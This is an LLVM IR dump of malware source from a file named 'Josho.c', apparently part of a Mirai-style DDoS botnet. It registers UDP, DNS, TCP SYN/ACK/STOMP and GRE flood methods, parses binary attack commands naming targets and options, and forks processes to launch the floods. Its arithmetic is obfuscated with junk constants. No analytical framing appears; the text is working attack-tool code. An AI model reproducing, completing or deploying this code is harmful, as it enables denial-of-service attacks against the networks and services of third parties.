; ModuleID = 'host/ir_sub/Josho.c.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [8 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common global i32 0, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@table = common global [43 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 1043935, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  call void @add_attack(i8 zeroext 0, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_generic)
  call void @add_attack(i8 zeroext 1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_vse)
  call void @add_attack(i8 zeroext 2, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_dns)
  call void @add_attack(i8 zeroext 8, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_plain)
  call void @add_attack(i8 zeroext 3, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_syn)
  call void @add_attack(i8 zeroext 4, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_ack)
  call void @add_attack(i8 zeroext 5, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_stomp)
  call void @add_attack(i8 zeroext 6, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_ip)
  call void @add_attack(i8 zeroext 7, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_eth)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = sub i32 0, 1
  %19 = sub i32 %17, %18
  %20 = add nsw i32 %17, 1
  %21 = sext i32 %19 to i64
  %22 = mul i64 %21, 8
  %23 = call i8* @realloc(i8* %15, i64 %22) #6
  %24 = bitcast i8* %23 to %struct.attack_method**
  store %struct.attack_method** %24, %struct.attack_method*** @methods, align 8
  %25 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %26 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %27 = load i8, i8* @methods_len, align 1
  %28 = sub i8 0, 1
  %29 = sub i8 %27, %28
  %30 = add i8 %27, 1
  store i8 %29, i8* @methods_len, align 1
  %31 = zext i8 %27 to i64
  %32 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %26, i64 %31
  store %struct.attack_method* %25, %struct.attack_method** %32, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %2
  br label %248

; <label>:17:                                     ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 %20) #7
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = sub i64 0, 4
  %27 = add i64 %25, %26
  %28 = sub i64 %25, 4
  %29 = trunc i64 %27 to i32
  store i32 %29, i32* %4, align 4
  %30 = load i32, i32* %4, align 4
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %32, label %33

; <label>:32:                                     ; preds = %17
  br label %248

; <label>:33:                                     ; preds = %17
  %34 = load i8*, i8** %3, align 8
  %35 = getelementptr inbounds i8, i8* %34, i32 1
  store i8* %35, i8** %3, align 8
  %36 = load i8, i8* %34, align 1
  store i8 %36, i8* %7, align 1
  %37 = load i32, i32* %4, align 4
  %38 = sext i32 %37 to i64
  %39 = sub i64 0, 1
  %40 = add i64 %38, %39
  %41 = sub i64 %38, 1
  %42 = trunc i64 %40 to i32
  store i32 %42, i32* %4, align 4
  %43 = load i32, i32* %4, align 4
  %44 = icmp eq i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %33
  br label %248

; <label>:46:                                     ; preds = %33
  %47 = load i8*, i8** %3, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %3, align 8
  %49 = load i8, i8* %47, align 1
  store i8 %49, i8* %8, align 1
  %50 = load i32, i32* %4, align 4
  %51 = sext i32 %50 to i64
  %52 = sub i64 %51, 1453443044116778083
  %53 = sub i64 %52, 1
  %54 = add i64 %53, 1453443044116778083
  %55 = sub i64 %51, 1
  %56 = trunc i64 %54 to i32
  store i32 %56, i32* %4, align 4
  %57 = load i8, i8* %8, align 1
  %58 = zext i8 %57 to i32
  %59 = icmp eq i32 %58, 0
  br i1 %59, label %60, label %61

; <label>:60:                                     ; preds = %46
  br label %248

; <label>:61:                                     ; preds = %46
  %62 = load i32, i32* %4, align 4
  %63 = sext i32 %62 to i64
  %64 = load i8, i8* %8, align 1
  %65 = zext i8 %64 to i64
  %66 = mul i64 5, %65
  %67 = icmp ult i64 %63, %66
  br i1 %67, label %68, label %69

; <label>:68:                                     ; preds = %61
  br label %248

; <label>:69:                                     ; preds = %61
  %70 = load i8, i8* %8, align 1
  %71 = zext i8 %70 to i64
  %72 = call noalias i8* @calloc(i64 %71, i64 24) #6
  %73 = bitcast i8* %72 to %struct.attack_target*
  store %struct.attack_target* %73, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %74

; <label>:74:                                     ; preds = %123, %69
  %75 = load i32, i32* %5, align 4
  %76 = load i8, i8* %8, align 1
  %77 = zext i8 %76 to i32
  %78 = icmp slt i32 %75, %77
  br i1 %78, label %79, label %129

; <label>:79:                                     ; preds = %74
  %80 = load i8*, i8** %3, align 8
  %81 = bitcast i8* %80 to i32*
  %82 = load i32, i32* %81, align 4
  %83 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %84 = load i32, i32* %5, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %83, i64 %85
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %86, i32 0, i32 1
  store i32 %82, i32* %87, align 4
  %88 = load i8*, i8** %3, align 8
  %89 = getelementptr inbounds i8, i8* %88, i64 4
  store i8* %89, i8** %3, align 8
  %90 = load i8*, i8** %3, align 8
  %91 = getelementptr inbounds i8, i8* %90, i32 1
  store i8* %91, i8** %3, align 8
  %92 = load i8, i8* %90, align 1
  %93 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %94 = load i32, i32* %5, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %93, i64 %95
  %97 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %96, i32 0, i32 2
  store i8 %92, i8* %97, align 4
  %98 = load i32, i32* %4, align 4
  %99 = sext i32 %98 to i64
  %100 = sub i64 0, 5
  %101 = add i64 %99, %100
  %102 = sub i64 %99, 5
  %103 = trunc i64 %101 to i32
  store i32 %103, i32* %4, align 4
  %104 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %105 = load i32, i32* %5, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %104, i64 %106
  %108 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %107, i32 0, i32 0
  %109 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %108, i32 0, i32 0
  store i16 2, i16* %109, align 4
  %110 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %111 = load i32, i32* %5, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %110, i64 %112
  %114 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %113, i32 0, i32 1
  %115 = load i32, i32* %114, align 4
  %116 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %117 = load i32, i32* %5, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %116, i64 %118
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %119, i32 0, i32 0
  %121 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %120, i32 0, i32 2
  %122 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %121, i32 0, i32 0
  store i32 %115, i32* %122, align 4
  br label %123

; <label>:123:                                    ; preds = %79
  %124 = load i32, i32* %5, align 4
  %125 = add i32 %124, -472534198
  %126 = add i32 %125, 1
  %127 = sub i32 %126, -472534198
  %128 = add nsw i32 %124, 1
  store i32 %127, i32* %5, align 4
  br label %74

; <label>:129:                                    ; preds = %74
  %130 = load i32, i32* %4, align 4
  %131 = sext i32 %130 to i64
  %132 = icmp ult i64 %131, 1
  br i1 %132, label %133, label %134

; <label>:133:                                    ; preds = %129
  br label %248

; <label>:134:                                    ; preds = %129
  %135 = load i8*, i8** %3, align 8
  %136 = getelementptr inbounds i8, i8* %135, i32 1
  store i8* %136, i8** %3, align 8
  %137 = load i8, i8* %135, align 1
  store i8 %137, i8* %9, align 1
  %138 = load i32, i32* %4, align 4
  %139 = sext i32 %138 to i64
  %140 = sub i64 %139, -4106802401067012022
  %141 = sub i64 %140, 1
  %142 = add i64 %141, -4106802401067012022
  %143 = sub i64 %139, 1
  %144 = trunc i64 %142 to i32
  store i32 %144, i32* %4, align 4
  %145 = load i8, i8* %9, align 1
  %146 = zext i8 %145 to i32
  %147 = icmp sgt i32 %146, 0
  br i1 %147, label %148, label %240

; <label>:148:                                    ; preds = %134
  %149 = load i8, i8* %9, align 1
  %150 = zext i8 %149 to i64
  %151 = call noalias i8* @calloc(i64 %150, i64 16) #6
  %152 = bitcast i8* %151 to %struct.attack_option*
  store %struct.attack_option* %152, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %153

; <label>:153:                                    ; preds = %233, %148
  %154 = load i32, i32* %5, align 4
  %155 = load i8, i8* %9, align 1
  %156 = zext i8 %155 to i32
  %157 = icmp slt i32 %154, %156
  br i1 %157, label %158, label %239

; <label>:158:                                    ; preds = %153
  %159 = load i32, i32* %4, align 4
  %160 = sext i32 %159 to i64
  %161 = icmp ult i64 %160, 1
  br i1 %161, label %162, label %163

; <label>:162:                                    ; preds = %158
  br label %248

; <label>:163:                                    ; preds = %158
  %164 = load i8*, i8** %3, align 8
  %165 = getelementptr inbounds i8, i8* %164, i32 1
  store i8* %165, i8** %3, align 8
  %166 = load i8, i8* %164, align 1
  %167 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %168 = load i32, i32* %5, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %167, i64 %169
  %171 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %170, i32 0, i32 1
  store i8 %166, i8* %171, align 8
  %172 = load i32, i32* %4, align 4
  %173 = sext i32 %172 to i64
  %174 = sub i64 0, 1
  %175 = add i64 %173, %174
  %176 = sub i64 %173, 1
  %177 = trunc i64 %175 to i32
  store i32 %177, i32* %4, align 4
  %178 = load i32, i32* %4, align 4
  %179 = sext i32 %178 to i64
  %180 = icmp ult i64 %179, 1
  br i1 %180, label %181, label %182

; <label>:181:                                    ; preds = %163
  br label %248

; <label>:182:                                    ; preds = %163
  %183 = load i8*, i8** %3, align 8
  %184 = getelementptr inbounds i8, i8* %183, i32 1
  store i8* %184, i8** %3, align 8
  %185 = load i8, i8* %183, align 1
  store i8 %185, i8* %12, align 1
  %186 = load i32, i32* %4, align 4
  %187 = sext i32 %186 to i64
  %188 = sub i64 %187, -2000586919079916105
  %189 = sub i64 %188, 1
  %190 = add i64 %189, -2000586919079916105
  %191 = sub i64 %187, 1
  %192 = trunc i64 %190 to i32
  store i32 %192, i32* %4, align 4
  %193 = load i32, i32* %4, align 4
  %194 = load i8, i8* %12, align 1
  %195 = zext i8 %194 to i32
  %196 = icmp slt i32 %193, %195
  br i1 %196, label %197, label %198

; <label>:197:                                    ; preds = %182
  br label %248

; <label>:198:                                    ; preds = %182
  %199 = load i8, i8* %12, align 1
  %200 = zext i8 %199 to i32
  %201 = add i32 %200, -1204909229
  %202 = add i32 %201, 1
  %203 = sub i32 %202, -1204909229
  %204 = add nsw i32 %200, 1
  %205 = sext i32 %203 to i64
  %206 = call noalias i8* @calloc(i64 %205, i64 1) #6
  %207 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %208 = load i32, i32* %5, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %207, i64 %209
  %211 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %210, i32 0, i32 0
  store i8* %206, i8** %211, align 8
  %212 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %213 = load i32, i32* %5, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %212, i64 %214
  %216 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %215, i32 0, i32 0
  %217 = load i8*, i8** %216, align 8
  %218 = load i8*, i8** %3, align 8
  %219 = load i8, i8* %12, align 1
  %220 = zext i8 %219 to i32
  call void @util_memcpy(i8* %217, i8* %218, i32 %220)
  %221 = load i8, i8* %12, align 1
  %222 = zext i8 %221 to i32
  %223 = load i8*, i8** %3, align 8
  %224 = sext i32 %222 to i64
  %225 = getelementptr inbounds i8, i8* %223, i64 %224
  store i8* %225, i8** %3, align 8
  %226 = load i8, i8* %12, align 1
  %227 = zext i8 %226 to i32
  %228 = load i32, i32* %4, align 4
  %229 = add i32 %228, 514194820
  %230 = sub i32 %229, %227
  %231 = sub i32 %230, 514194820
  %232 = sub nsw i32 %228, %227
  store i32 %231, i32* %4, align 4
  br label %233

; <label>:233:                                    ; preds = %198
  %234 = load i32, i32* %5, align 4
  %235 = sub i32 %234, 189249691
  %236 = add i32 %235, 1
  %237 = add i32 %236, 189249691
  %238 = add nsw i32 %234, 1
  store i32 %237, i32* %5, align 4
  br label %153

; <label>:239:                                    ; preds = %153
  br label %240

; <label>:240:                                    ; preds = %239, %134
  %241 = call i32* @__errno_location() #7
  store i32 0, i32* %241, align 4
  %242 = load i32, i32* %6, align 4
  %243 = load i8, i8* %7, align 1
  %244 = load i8, i8* %8, align 1
  %245 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %246 = load i8, i8* %9, align 1
  %247 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %242, i8 zeroext %243, i8 zeroext %244, %struct.attack_target* %245, i8 zeroext %246, %struct.attack_option* %247)
  br label %248

; <label>:248:                                    ; preds = %240, %197, %181, %162, %133, %68, %60, %45, %32, %16
  %249 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %250 = icmp ne %struct.attack_target* %249, null
  br i1 %250, label %251, label %254

; <label>:251:                                    ; preds = %248
  %252 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %253 = bitcast %struct.attack_target* %252 to i8*
  call void @free(i8* %253) #6
  br label %254

; <label>:254:                                    ; preds = %251, %248
  %255 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %256 = icmp ne %struct.attack_option* %255, null
  br i1 %256, label %257, label %261

; <label>:257:                                    ; preds = %254
  %258 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %259 = load i8, i8* %9, align 1
  %260 = zext i8 %259 to i32
  call void @free_opts(%struct.attack_option* %258, i32 %260)
  br label %261

; <label>:261:                                    ; preds = %257, %254
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %15 = call i32 @fork() #6
  store i32 %15, i32* %13, align 4
  %16 = load i32, i32* %13, align 4
  %17 = icmp sgt i32 %16, 0
  br i1 %17, label %21, label %18

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %13, align 4
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %18, %6
  ret void

; <label>:22:                                     ; preds = %18
  store i32 0, i32* %14, align 4
  store i32 0, i32* %14, align 4
  br label %23

; <label>:23:                                     ; preds = %54, %22
  %24 = load i32, i32* %14, align 4
  %25 = load i8, i8* @methods_len, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp slt i32 %24, %26
  br i1 %27, label %28, label %61

; <label>:28:                                     ; preds = %23
  %29 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %29, i64 %31
  %33 = load %struct.attack_method*, %struct.attack_method** %32, align 8
  %34 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %33, i32 0, i32 1
  %35 = load i8, i8* %34, align 8
  %36 = zext i8 %35 to i32
  %37 = load i8, i8* %8, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp eq i32 %36, %38
  br i1 %39, label %40, label %53

; <label>:40:                                     ; preds = %28
  %41 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %42 = load i32, i32* %14, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %41, i64 %43
  %45 = load %struct.attack_method*, %struct.attack_method** %44, align 8
  %46 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %45, i32 0, i32 0
  %47 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %46, align 8
  %48 = load i32, i32* %7, align 4
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %51 = load i8, i8* %11, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %47(i32 %48, i8 zeroext %49, %struct.attack_target* %50, i8 zeroext %51, %struct.attack_option* %52)
  br label %61

; <label>:53:                                     ; preds = %28
  br label %54

; <label>:54:                                     ; preds = %53
  %55 = load i32, i32* %14, align 4
  %56 = sub i32 0, %55
  %57 = sub i32 0, 1
  %58 = add i32 %56, %57
  %59 = sub i32 0, %58
  %60 = add nsw i32 %55, 1
  store i32 %59, i32* %14, align 4
  br label %23

; <label>:61:                                     ; preds = %40, %23
  call void @exit(i32 0) #8
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %38

; <label>:9:                                      ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %30, %9
  %11 = load i32, i32* %5, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %11, %12
  br i1 %13, label %14, label %35

; <label>:14:                                     ; preds = %10
  %15 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %15, i64 %17
  %19 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %14
  %23 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %23, i64 %25
  %27 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  call void @free(i8* %28) #6
  br label %29

; <label>:29:                                     ; preds = %22, %14
  br label %30

; <label>:30:                                     ; preds = %29
  %31 = load i32, i32* %5, align 4
  %32 = sub i32 0, 1
  %33 = sub i32 %31, %32
  %34 = add nsw i32 %31, 1
  store i32 %33, i32* %5, align 4
  br label %10

; <label>:35:                                     ; preds = %10
  %36 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %37 = bitcast %struct.attack_option* %36 to i8*
  call void @free(i8* %37) #6
  br label %38

; <label>:38:                                     ; preds = %35, %8
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %41

; <label>:16:                                     ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %43

; <label>:34:                                     ; preds = %16
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = sub i32 %36, -1711690738
  %38 = add i32 %37, 1
  %39 = add i32 %38, -1711690738
  %40 = add nsw i32 %36, 1
  store i32 %39, i32* %10, align 4
  br label %11

; <label>:41:                                     ; preds = %11
  %42 = load i8*, i8** %9, align 8
  store i8* %42, i8** %5, align 8
  br label %43

; <label>:43:                                     ; preds = %41, %27
  %44 = load i8*, i8** %5, align 8
  ret i8* %44
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* %20, i32 10)
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* %20) #6
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
